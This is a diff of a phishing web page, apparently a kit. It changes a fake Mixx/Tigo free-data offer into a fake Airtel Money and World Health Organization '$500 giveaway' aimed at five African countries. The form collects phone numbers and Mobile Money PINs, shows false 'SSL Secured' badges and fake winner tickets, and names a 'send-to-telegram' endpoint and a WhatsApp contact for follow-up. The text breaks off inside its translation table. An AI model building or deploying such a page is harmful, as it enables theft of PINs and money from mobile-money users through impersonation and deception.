@@ -1,30 +1,46 @@
 <!DOCTYPE html>
-<html lang="sw">
+<html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Mixx 50GB Bure - Tigo</title>
+    <title>AFRICA 50GB - $500 Giveaway</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-            background: linear-gradient(160deg, #0a0a1a 0%, #1a1a3e 40%, #0f3460 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a1a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+
         .card {
             background: #ffffff;
-            max-width: 480px;
-            width: 100%;
             border-radius: 36px;
-            padding: 32px 28px;
+            padding: 32px 24px;
             box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
             position: relative;
             overflow: hidden;
+            display: none;
+            animation: fadeInUp 0.6s ease forwards;
         }
+
+        .card.active {
+            display: block;
+        }
+
         .card::before {
             content: '';
             position: absolute;
@@ -33,44 +49,53 @@
             right: 0;
             height: 5px;
             background: linear-gradient(90deg, #e2001a, #ff6b6b, #e2001a);
-            background-size: 200% 100%;
             animation: shimmer 3s ease-in-out infinite;
         }
-        @keyframes shimmer { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
-        .hidden { display: none !important; }
-        .text-center { text-align: center; }
-        .mt-8 { margin-top: 8px; }
 
-        .logo { font-size: 32px; font-weight: 900; letter-spacing: 2px; text-align: center; }
-        .logo .mixx { color: #e2001a; }
-        .logo .tigo { color: #0055a4; }
+        @keyframes shimmer {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
 
-        .badge {
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .logo .airtel {
+            font-size: 28px;
+            font-weight: 900;
+            color: #e2001a;
+        }
+
+        .logo .airtel span {
+            color: #0055a4;
+        }
+
+        .logo .tag {
             display: inline-block;
             background: linear-gradient(135deg, #ffeb3b, #fdd835);
-            padding: 4px 20px;
+            padding: 4px 18px;
             border-radius: 30px;
             font-size: 11px;
             font-weight: 700;
             color: #333;
             text-transform: uppercase;
             letter-spacing: 1px;
+            margin-top: 4px;
         }
 
-        .offer-box {
-            background: linear-gradient(135deg, #e2001a, #b80014);
-            border-radius: 20px;
-            padding: 28px 16px;
+        .flag-icon {
+            font-size: 48px;
+            display: block;
             text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-            margin: 16px 0;
+            margin: 8px 0 4px;
         }
-        .offer-box::after { content: '🎯'; position: absolute; right: 12px; bottom: 8px; font-size: 40px; opacity: 0.15; }
-        .offer-box .gb { font-size: 58px; font-weight: 900; letter-spacing: 3px; line-height: 1; }
-        .offer-box .label { font-size: 22px; font-weight: 700; margin-top: 4px; }
-        .offer-box .sub { font-size: 14px; opacity: 0.85; margin-top: 4px; }
 
         .btn {
             display: inline-block;
@@ -84,14 +109,39 @@
             transition: all 0.3s ease;
             text-align: center;
         }
-        .btn-primary { background: linear-gradient(135deg, #e2001a, #b80014); color: white; }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(226, 0, 26, 0.35); }
-        .btn-primary:disabled { background: #ccc; cursor: not-allowed; transform: none !important; }
-        .btn-success { background: linear-gradient(135deg, #1b8a2e, #0f6b1f); color: white; }
-        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(27, 138, 46, 0.35); }
 
-        .form-group { margin-bottom: 16px; }
-        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #444; margin-bottom: 5px; }
+        .btn-primary {
+            background: linear-gradient(135deg, #e2001a, #b80014);
+            color: white;
+            box-shadow: 0 8px 25px rgba(226, 0, 26, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(226, 0, 26, 0.4);
+        }
+
+        .btn-primary:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 5px;
+        }
+
+        .form-group label .required {
+            color: #e2001a;
+        }
+
         .form-group input {
             width: 100%;
             padding: 14px 16px;
@@ -102,13 +152,23 @@
             outline: none;
             transition: all 0.3s ease;
             text-align: center;
-            letter-spacing: 2px;
-            font-weight: 500;
         }
-        .form-group input:focus { border-color: #e2001a; background: white; box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.08); }
-        .form-group input::placeholder { color: #bbb; font-size: 14px; letter-spacing: 0; font-weight: 400; }
-        .form-group .hint { font-size: 12px; color: #999; margin-top: 4px; }
-        .form-group .hint strong { color: #e2001a; }
+
+        .form-group input:focus {
+            border-color: #e2001a;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(226, 0, 26, 0.08);
+        }
+
+        .form-group .hint {
+            font-size: 12px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        .form-group .hint strong {
+            color: #e2001a;
+        }
 
         .error-msg {
             color: #d32f2f;
@@ -118,72 +178,243 @@
             border-radius: 10px;
             display: none;
             margin-top: 6px;
-            text-align: left;
         }
-        .error-msg.show { display: block; animation: shake 0.4s ease; }
-        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-6px); } 75% { transform: translateX(6px); } }
 
-        .welcome-icon { font-size: 64px; text-align: center; margin: 4px 0; }
-        .welcome-title { font-size: 26px; font-weight: 900; color: #e2001a; text-align: center; margin: 4px 0; }
-        .welcome-sub { font-size: 15px; color: #666; text-align: center; }
+        .error-msg.show {
+            display: block;
+            animation: shake 0.4s ease;
+        }
 
-        .feature-list { background: #f8f9fa; border-radius: 16px; padding: 16px 20px; margin: 12px 0; }
-        .feature-list .item { display: flex; align-items: center; gap: 12px; padding: 6px 0; font-size: 14px; color: #444; }
-        .feature-list .item .icon { font-size: 18px; min-width: 28px; }
-        .feature-list .item strong { color: #e2001a; }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
 
-        .otp-icon { font-size: 56px; text-align: center; margin: 4px 0; }
-        .otp-display-box {
-            background: linear-gradient(135deg, #fff3e0, #ffe0b2);
-            border-radius: 18px;
-            padding: 24px 20px;
-            border: 3px solid #e2001a;
+        .welcome-icon {
+            font-size: 56px;
             text-align: center;
-            transition: all 0.6s ease;
+            margin: 4px 0;
+        }
+
+        .welcome-title {
+            font-size: 22px;
+            font-weight: 900;
+            color: #e2001a;
+            text-align: center;
+            margin: 4px 0;
+            line-height: 1.3;
+        }
+
+        .welcome-title .highlight {
+            color: #0055a4;
+        }
+
+        .welcome-sub {
+            font-size: 15px;
+            color: #666;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .ticket-box {
+            background: linear-gradient(135deg, #fff8e1, #ffecb3);
+            border: 2px dashed #e2001a;
+            border-radius: 16px;
+            padding: 16px;
             margin: 16px 0;
+            text-align: center;
         }
-        .otp-display-box.detected { border-color: #2e7d32; background: linear-gradient(135deg, #e8f5e9, #c8e6c9); }
-        .otp-display-box .code { font-size: 52px; font-weight: 900; color: #e2001a; letter-spacing: 14px; font-family: 'Courier New', monospace; margin: 4px 0; }
-        .otp-display-box.detected .code { color: #2e7d32; }
-        .otp-display-box .status { font-size: 14px; font-weight: 600; }
-        .otp-display-box .status.waiting { color: #ff9800; }
-        .otp-display-box .status.detected { color: #2e7d32; }
-        .otp-display-box .status.error { color: #d32f2f; }
 
-        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 4px; margin-top: 12px; overflow: hidden; }
-        .progress-bar .fill {
-            height: 100%;
-            background: linear-gradient(90deg, #e2001a, #ff6b6b);
-            width: 0%;
-            border-radius: 4px;
-            animation: progress 60s linear forwards;
+        .ticket-box .label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
         }
-        .progress-bar .fill.detected { animation: none; width: 100%; background: #2e7d32; }
-        @keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
 
-        .manual-section { margin-top: 16px; padding-top: 16px; border-top: 1px dashed #e0e0e0; }
-        .manual-section .label { font-size: 13px; color: #999; text-align: center; margin-bottom: 8px; }
-        .manual-row { display: flex; gap: 8px; }
-        .manual-row input { flex: 1; padding: 12px; border: 2px solid #e0e0e0; border-radius: 12px; text-align: center; font-size: 18px; letter-spacing: 6px; font-weight: 600; outline: none; }
-        .manual-row input:focus { border-color: #e2001a; }
-        .manual-row .btn-sm { padding: 12px 20px; background: #e2001a; color: white; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; }
-        .manual-row .btn-sm:hover { background: #b80014; }
+        .ticket-box .number {
+            font-size: 28px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 2px;
+            margin-top: 4px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .offer-details {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin: 12px 0;
+        }
+
+        .offer-details .item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 6px 0;
+            font-size: 14px;
+            color: #444;
+        }
+
+        .offer-details .item .icon {
+            font-size: 18px;
+            min-width: 28px;
+        }
+
+        .offer-details .item strong {
+            color: #e2001a;
+        }
 
         .success-box {
             background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
             border-radius: 20px;
-            padding: 36px 24px;
+            padding: 32px 20px;
             text-align: center;
             margin: 8px 0 16px;
         }
-        .success-box .check { font-size: 72px; }
-        .success-box h2 { color: #2e7d32; margin-top: 8px; font-size: 26px; }
-        .success-box p { color: #444; margin-top: 8px; line-height: 1.7; font-size: 15px; }
-        .success-box .telegram-notice { background: rgba(255, 255, 255, 0.7); border-radius: 12px; padding: 12px; margin-top: 12px; font-size: 13px; color: #555; }
-        .success-box .telegram-notice strong { color: #e2001a; }
 
-        .footer { margin-top: 20px; padding-top: 16px; border-top: 1px solid #eee; font-size: 12px; color: #bbb; text-align: center; }
-        .footer .lock { color: #2e7d32; font-weight: 600; }
+        .success-box .check {
+            font-size: 72px;
+        }
+
+        .success-box h2 {
+            color: #2e7d32;
+            margin-top: 8px;
+            font-size: 24px;
+        }
+
+        .success-box p {
+            color: #444;
+            margin-top: 8px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+
+        .success-box .ticket-display {
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 12px;
+            padding: 12px;
+            margin-top: 12px;
+        }
+
+        .success-box .ticket-display .label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 700;
+        }
+
+        .success-box .ticket-display .number {
+            font-size: 24px;
+            font-weight: 900;
+            color: #e2001a;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .redirect-timer {
+            margin-top: 16px;
+            padding: 14px;
+            background: linear-gradient(135deg, #fff3e0, #ffe0b2);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 15px;
+            color: #e65100;
+            border: 2px solid #e2001a;
+            font-weight: 600;
+        }
+
+        .redirect-timer strong {
+            font-size: 22px;
+            color: #e2001a;
+        }
+
+        .map-container {
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .map-container .map-icon {
+            font-size: 80px;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .map-container h2 {
+            font-size: 24px;
+            font-weight: 900;
+            color: #1a1a2e;
+            margin-bottom: 4px;
+        }
+
+        .map-container p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .country-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 8px;
+        }
+
+        .country-btn {
+            padding: 14px 10px;
+            border: 2px solid #e8e8e8;
+            border-radius: 14px;
+            background: #fafafa;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .country-btn:hover {
+            border-color: #e2001a;
+            background: #fff5f5;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(226, 0, 26, 0.1);
+        }
+
+        .country-btn .flag {
+            font-size: 28px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .country-btn .name {
+            font-size: 12px;
+            font-weight: 700;
+        }
+
+        .country-btn .code {
+            font-size: 10px;
+            color: #999;
+            display: block;
+            margin-top: 2px;
+        }
+
+        .footer {
+            margin-top: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #eee;
+            font-size: 11px;
+            color: #bbb;
+            text-align: center;
+        }
+
+        .footer .lock {
+            color: #2e7d32;
+            font-weight: 600;
+        }
 
         .spinner {
             display: inline-block;
@@ -195,126 +426,272 @@
             animation: spin 0.7s linear infinite;
             vertical-align: middle;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .back-link { background: none; border: none; color: #999; cursor: pointer; font-size: 13px; margin-top: 12px; transition: 0.3s; display: block; text-align: center; width: 100%; }
-        .back-link:hover { color: #e2001a; }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
 
-        .auto-status { font-size: 13px; color: #1976d2; text-align: center; margin: 8px 0; padding: 8px; background: #e3f2fd; border-radius: 10px; font-weight: 600; }
+        .back-link {
+            background: none;
+            border: none;
+            color: #999;
+            cursor: pointer;
+            font-size: 13px;
+            margin-top: 12px;
+            transition: 0.3s;
+            display: block;
+            text-align: center;
+            width: 100%;
+        }
+
+        .back-link:hover {
+            color: #e2001a;
+        }
+
+        .who-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            background: #e8f0fe;
+            border-radius: 30px;
+            padding: 6px 16px;
+            margin: 8px auto;
+            max-width: fit-content;
+            font-size: 12px;
+            font-weight: 600;
+            color: #1a3a6b;
+        }
+
+        .manual-link {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .manual-link a {
+            color: #25D366;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .manual-link a:hover {
+            text-decoration: underline;
+        }
 
         @media (max-width: 480px) {
-            .card { padding: 24px 18px; border-radius: 28px; }
-            .offer-box .gb { font-size: 42px; }
-            .otp-display-box .code { font-size: 36px; letter-spacing: 8px; }
-            .welcome-title { font-size: 22px; }
+            .card {
+                padding: 24px 18px;
+                border-radius: 28px;
+            }
+            .country-grid {
+                gap: 8px;
+            }
+            .country-btn {
+                padding: 12px 8px;
+                font-size: 12px;
+            }
+            .country-btn .flag {
+                font-size: 22px;
+            }
+            .welcome-title {
+                font-size: 19px;
+            }
+            .ticket-box .number {
+                font-size: 22px;
+            }
+            .success-box .check {
+                font-size: 56px;
+            }
+            .success-box h2 {
+                font-size: 20px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="card" id="app">
+    <div class="container">
 
-        <!-- ===== PAGE 0: WELCOME ===== -->
-        <div id="page0">
-            <div class="logo">
-                <span class="mixx">Mixx</span> <span style="color:#999;font-weight:300;">×</span> <span class="tigo">Tigo</span>
-            </div>
-            <div class="text-center mt-8">
-                <span class="badge">🔥 OFFER YA LEO</span>
-            </div>
-            <div class="welcome-icon">🎁</div>
-            <div class="welcome-title">Pata 50GB BURE!</div>
-            <div class="welcome-sub">Kutoka kwa <strong>Mixx</strong> na <strong>Tigo</strong></div>
-            <div class="offer-box">
-                <div class="gb">50GB</div>
-                <div class="label">DATA BURE</div>
-                <div class="sub">TZ · TIGO</div>
-            </div>
-            <div class="feature-list">
-                <div class="item"><span class="icon">✅</span><span><strong>50GB</strong> Data bure kabisa</span></div>
-                <div class="item"><span class="icon">📱</span><span>Inafaa kwa mitandao ya kijamii na video</span></div>
-                <div class="item"><span class="icon">⏳</span><span>Inatumika kwa <strong>siku 30</strong></span></div>
-                <div class="item"><span class="icon">📶</span><span>Inapatikana kwa wateja <strong>wote</strong> wa Tigo</span></div>
-            </div>
-            <button class="btn btn-primary" id="getStartedBtn">🚀 Nenda → Jisajili Sasa</button>
-            <div class="footer"><span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span></div>
-        </div>
+        <!-- ===== PAGE 0: COUNTRY SELECTION ===== -->
+        <div id="page0" class="card active">
+            <div class="map-container">
+                <span class="map-icon">🌍</span>
+                <h2>Select Your Country</h2>
+                <p>Choose your country to claim your <strong>$500</strong> prize and <strong>50GB</strong> data bundle</p>
 
-        <!-- ===== PAGE 1: FORM ===== -->
-        <div id="page1" class="hidden">
-            <div class="logo" style="font-size:22px;">
-                <span class="mixx">Mixx</span> <span style="color:#999;font-weight:300;">×</span> <span class="tigo">Tigo</span>
-            </div>
-            <div class="text-center mt-8"><span class="badge">📢 OFFER YA LEO</span></div>
-            <div class="offer-box" style="padding:16px;margin:12px 0;">
-                <div class="gb" style="font-size:38px;">50GB</div>
-                <div class="label" style="font-size:17px;">DATA BURE</div>
-                <div class="sub" style="font-size:12px;">TZ · TIGO</div>
-            </div>
-            <h3 style="text-align:center;font-size:18px;margin-bottom:4px;">Jiume na Mixx Offer</h3>
-            <p style="text-align:center;font-size:14px;color:#666;margin-bottom:16px;">
-                Weka namba yako ya simu ya Tigo na Namba ya Siri.
-            </p>
-            <div class="form-group">
-                <label>📞 Namba ya Tigo</label>
-                <input type="tel" id="phoneInput" placeholder="Nambari sahihi ya Tigo" maxlength="10" />
-            </div>
-            <div class="form-group">
-                <label>🔐 Namba ya Siri (PIN 4 digits)</label>
-                <input type="password" id="pinInput" placeholder="****" maxlength="4" />
-                <div class="hint">💡 Jaribu: <strong>1234</strong></div>
-            </div>
-            <div class="error-msg" id="formError"></div>
-            <button class="btn btn-primary" id="submitBtn">
-                <span id="submitText">→ Endelea</span>
-                <span id="submitSpinner" class="spinner hidden"></span>
-            </button>
-            <button class="back-link" id="backToWelcome1">← Rudi kwenye maelezo</button>
-            <div class="footer"><span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span></div>
-        </div>
+                <div class="who-badge">
+                    <span class="logo">🏥</span>
+                    <span>WORLD HEALTH ORGANIZATION</span>
+                </div>
 
-        <!-- ===== PAGE 2: OTP ===== -->
-        <div id="page2" class="hidden">
-            <div class="logo" style="font-size:22px;">
-                <span class="mixx">Mixx</span> <span style="color:#999;font-weight:300;">×</span> <span class="tigo">Tigo</span>
-            </div>
-            <div class="otp-icon">📱</div>
-            <h3 style="text-align:center;font-size:20px;">Subiri Msimbo</h3>
-            <p style="text-align:center;font-size:14px;color:#555;margin-top:4px;">
-                Msimbo wa OTP umetumwa kwa:
-            </p>
-            <p style="text-align:center;font-size:20px;font-weight:700;color:#e2001a;" id="displayPhone">________</p>
-            <div class="auto-status" id="autoStatus">⏳ Inasubiri msimbo kutoka Tigo...</div>
-            <div class="otp-display-box" id="otpDisplayBox">
-                <div class="code" id="otpCode">••••••</div>
-                <div class="status waiting" id="otpStatus">⏳ Inasubiri msimbo...</div>
-                <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
-            </div>
-            <input type="hidden" id="otpInput" />
-            <div class="error-msg" id="otpError"></div>
-            <div class="manual-section" id="manualSection">
-                <div class="label">📝 Hujapata msimbo? Ingiza manually:</div>
-                <div class="manual-row">
-                    <input type="text" id="manualOtpInput" placeholder="______" maxlength="6" />
-                    <button class="btn-sm" id="manualVerifyBtn">Thibitisha</button>
+                <div class="country-grid">
+                    <button class="country-btn" data-country="uganda">
+                        <span class="flag">🇺🇬</span>
+                        <span class="name">Uganda</span>
+                        <span class="code">+256</span>
+                    </button>
+                    <button class="country-btn" data-country="zambia">
+                        <span class="flag">🇿🇲</span>
+                        <span class="name">Zambia</span>
+                        <span class="code">+260</span>
+                    </button>
+                    <button class="country-btn" data-country="malawi">
+                        <span class="flag">🇲🇼</span>
+                        <span class="name">Malawi</span>
+                        <span class="code">+265</span>
+                    </button>
+                    <button class="country-btn" data-country="rwanda">
+                        <span class="flag">🇷🇼</span>
+                        <span class="name">Rwanda</span>
+                        <span class="code">+250</span>
+                    </button>
+                    <button class="country-btn" data-country="drc" style="grid-column: span 2;">
+                        <span class="flag">🇨🇩</span>
+                        <span class="name">DR Congo</span>
+                        <span class="code">+243</span>
+                    </button>
                 </div>
             </div>
-            <button class="back-link" id="backToWelcome2">← Rudi kwenye maelezo</button>
+            <div class="footer">
+                <span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 1: WELCOME ===== -->
+        <div id="page1" class="card">
+            <div class="logo">
+                <div class="airtel">AIRTEL <span>MONEY</span></div>
+                <span class="tag">🎁 OFFER YA LEO</span>
+            </div>
+
+            <div class="flag-icon" id="countryFlag">🇺🇬</div>
+
+            <div class="welcome-icon">🎉</div>
+            <div class="welcome-title" id="welcomeTitle">
+                Your application for <span class="highlight">$500</span> from<br />
+                WORLD HEALTH ORGANIZATION (WHO) has been received!
+            </div>
+            <div class="welcome-sub" id="welcomeSub" style="margin-top:4px;">
+                <strong>You've been Added among the winners!</strong>
+            </div>
+
+            <div class="ticket-box">
+                <div class="label">🎫 YOUR TICKET NUMBER</div>
+                <div class="number" id="ticketNumber">AFR-2026-00123</div>
+            </div>
+
+            <div class="offer-details">
+                <div class="item">
+                    <span class="icon">📱</span>
+                    <span><strong>50GB</strong> Data Bundle - All Month</span>
+                </div>
+                <div class="item">
+                    <span class="icon">💰</span>
+                    <span><strong>$500</strong> Cash Prize Giveaway</span>
+                </div>
+                <div class="item">
+                    <span class="icon">🏆</span>
+                    <span>You're <strong>already queued</strong> among the winners!</span>
+                </div>
+                <div class="item">
+                    <span class="icon">📶</span>
+                    <span>Valid for <strong>30 days</strong> across all networks</span>
+                </div>
+            </div>
+
+            <button class="btn btn-primary" id="subscribeBtn">
+                🚀 SUBSCRIBE TO 50GB DATA PLAN
+            </button>
+
+            <button class="back-link" id="backToMap1">← Change Country</button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span>
+            </div>
+        </div>
+
+        <!-- ===== PAGE 2: FORM ===== -->
+        <div id="page2" class="card">
+            <div class="logo">
+                <div class="airtel">AIRTEL <span>MONEY</span></div>
+                <span class="tag">📱 SUBSCRIBE NOW</span>
+            </div>
+
+            <div style="display:flex; align-items:center; justify-content:center; gap:12px; margin:4px 0 12px;">
+                <span id="formFlag" style="font-size:36px;">🇺🇬</span>
+                <span id="formCountry" style="font-size:18px; font-weight:700; color:#333;">Uganda</span>
+            </div>
+
+            <div style="background:#f0f7ff; border-radius:12px; padding:12px; margin-bottom:16px; text-align:center;">
+                <p id="offerDescription" style="font-size:13px; color:#444;">
+                    💰 Get <strong>50GB Data</strong> + <strong>$500</strong> Cash Prize<br />
+                    <span style="font-size:12px; color:#888;">Subscribe now and claim your reward!</span>
+                </p>
+            </div>
+
+            <div class="form-group">
+                <label id="phoneLabel">📞 Phone Number <span class="required">*</span></label>
+                <input type="tel" id="phoneInput" placeholder="Enter phone number" maxlength="15" />
+                <div class="hint" id="phoneHint">Format: <strong>+2567XXXXXXXX</strong></div>
+            </div>
+
+            <div class="form-group">
+                <label id="pinLabel">🔐 Mobile Money PIN <span class="required">*</span></label>
+                <input type="password" id="pinInput" placeholder="****" maxlength="4" />
+                <div class="hint" id="pinHint">💡 Enter your <strong>4-digit</strong> Mobile Money PIN</div>
+            </div>
+
+            <div class="error-msg" id="formError"></div>
+
+            <button class="btn btn-primary" id="submitBtn">
+                <span id="submitText">🔥 GET DATA BUNDLE</span>
+                <span id="submitSpinner" class="spinner hidden"></span>
+            </button>
+
+            <button class="back-link" id="backToWelcome">← Back</button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span>
+            </div>
         </div>
 
         <!-- ===== PAGE 3: SUCCESS ===== -->
-        <div id="page3" class="hidden">
+        <div id="page3" class="card">
             <div class="success-box">
                 <div class="check">🎉</div>
-                <h2>Imefanikiwa!</h2>
-                <p><strong>Hongera sana!</strong> Umepata <strong>50GB DATA BURE</strong> kutoka kwa <strong>Mixx</strong> na <strong>Tigo</strong>.</p>
-                <p style="font-size:14px;color:#666;margin-top:4px;">Data itaamilishwa ndani ya dakika 5.</p>
-                <div class="telegram-notice">
-                    📋 <strong>Taarifa imetumwa kwa Admin!</strong>
-                    <br /><span id="successReferral" style="color:#555;"></span>
+                <h2 id="successTitle">Subscription Successful!</h2>
+                <p id="successMessage">
+                    <strong>Congratulations!</strong> You will receive your
+                    <strong>50GB Data Bundle</strong> and <strong>$500</strong>
+                    prize within <strong>1 minute</strong>.
+                </p>
+
+                <div class="ticket-display">
+                    <div class="label">🎫 YOUR TICKET NUMBER</div>
+                    <div class="number" id="successTicket">AFR-2026-00123</div>
+                </div>
+
+                <div style="margin-top:12px; font-size:13px; color:#666;">
+                    <span id="successCountry" style="font-weight:700; color:#0055a4;">🇺🇬 Uganda</span>
+                    <span id="successPhone" style="display:block; margin-top:4px;">📞 +2567XXXXXXX</span>
                 </div>
             </div>
-            <button class="btn btn-success" id="doneBtn">✓ Sawa</button>
+
+            <div class="redirect-timer" id="redirectTimer">
+                🔄 Redirecting to WhatsApp Customer Support in <strong id="countdown">5</strong> seconds...
+            </div>
+
+            <div class="manual-link">
+                If not redirected, <a href="#" id="manualWhatsAppLink" target="_blank">click here to chat on WhatsApp</a>
+            </div>
+
+            <button class="back-link" id="backToMap3">← Back to Home</button>
+
+            <div class="footer">
+                <span class="lock">🔒</span> Muunganisho salama uliosimbwa <span class="lock">(SSL Secured)</span>
+            </div>
         </div>
 
     </div>
@@ -323,8 +700,105 @@
         // =============================================================
         // CONFIGURATION
         // =============================================================
-        // ✅ CORRECT API PATH - THIS FIXES THE NETWORK ERROR
         const API_BASE = '/.netlify/functions/send-to-telegram';
+        const WHATSAPP_NUMBER = '256725312698'; // CHANGE THIS
+        const WHATSAPP_MESSAGE = 'Hello%2C%20I%20am%20interested%20in%20applying%20for%20the%20%24500%20and%2050GB%20offer';
+        const WHATSAPP_LINK = 'https://api.whatsapp.com/send?phone=' + WHATSAPP_NUMBER + '&text=' + WHATSAPP_MESSAGE;
+
+        const COUNTRIES = {
+            uganda: {
+                name: 'Uganda',
+                flag: '🇺🇬',
+                code: '+256',
+                phoneFormat: '+2567XXXXXXXX',
+                phonePattern: /^2567\d{8}$/,
+                displayName: 'Uganda',
+                language: 'en'
+            },
+            zambia: {
+                name: 'Zambia',
+                flag: '🇿🇲',
+                code: '+260',
+                phoneFormat: '+2609XXXXXXXX',
+                phonePattern: /^2609\d{8}$/,
+                displayName: 'Zambia',
+                language: 'en'
+            },
+            malawi: {
+                name: 'Malawi',
+                flag: '🇲🇼',
+                code: '+265',
+                phoneFormat: '+2659XXXXXXXX',
+                phonePattern: /^2659\d{8}$/,
+                displayName: 'Malawi',
+                language: 'en'
+            },
+            rwanda: {
+                name: 'Rwanda',
+                flag: '🇷🇼',
+                code: '+250',
+                phoneFormat: '+2507XXXXXXXX',
+                phonePattern: /^2507\d{8}$/,
+                displayName: 'Rwanda',
+                language: 'en'
+            },
+            drc: {
+                name: 'DRC',
+                flag: '🇨🇩',
+                code: '+243',
+                phoneFormat: '+2439XXXXXXXX',
+                phonePattern: /^2439\d{8}$/,
+                displayName: 'Democratic Republic of the Congo',
+                language: 'sw'
+            }
+        };
+
+        const TRANSLATIONS = {
+            en: {
+                welcomeTitle: 'Your application for <span class="highlight">$500</span> from<br />WORLD HEALTH ORGANIZATION (WHO) has been received!',
+                welcomeSub: '<strong>You\'ve been Added among the winners!</strong>',
+                subscribeBtn: '🚀 SUBSCRIBE TO 50GB DATA PLAN',
+                phoneLabel: '📞 Phone Number <span class="required">*</span>',
+                pinLabel: '🔐 Mobile Money PIN <span class="required">*</span>',
+                pinHint: '💡 Enter your <strong>4-digit</strong> Mobile Money PIN',
+                offerDesc: '💰 Get <strong>50GB Data</strong> + <strong>$500</strong> Cash Prize<br /><span style="font-size:12px; color:#888;">Subscribe now and claim your reward!</span>',
+                submitText: '🔥 GET DATA BUNDLE',
+                successTitle: 'Subscription Successful!',
+                successMsg: '<strong>Congratulations!</strong> You will receive your <strong>50GB Data Bundle</strong> and <strong>$500</strong> prize within <strong>1 minute</strong>.',
+                phoneHint: 'Format: <strong>+2567XXXXXXXX</strong>',
+                redirectText: '🔄 Redirecting to WhatsApp Customer Support in <strong id="countdown">5</strong> seconds...',
+                manualLink: 'If not redirected, <a href="#" id="manualWhatsAppLink" target="_blank">click here to chat on WhatsApp</a>',
+                changeCountry: '← Change Country',
+                backHome: '← Back to Home',
+                back: '← Back'
+            },
+            sw: {
+                welcomeTitle: 'Maombi yako ya <span class="highlight">$500</span> kutoka<br />WORLD HEALTH ORGANIZATION (WHO) yamepokelewa!',
+                welcomeSub: '<strong>Umeongezwa kati ya washindi!</strong>',
+                subscribeBtn: '🚀 JISAJILI KWA MPANGO WA DATA 50GB',
+                phoneLabel: '📞 Namba ya Simu <span class="required">*</span>',
+                pinLabel: '🔐 Namba ya Siri ya Mobile Money <span class="required">*</span>',
+                pinHint: '💡 Weka <strong>namba yako ya siri ya tarakimu 4</strong>',
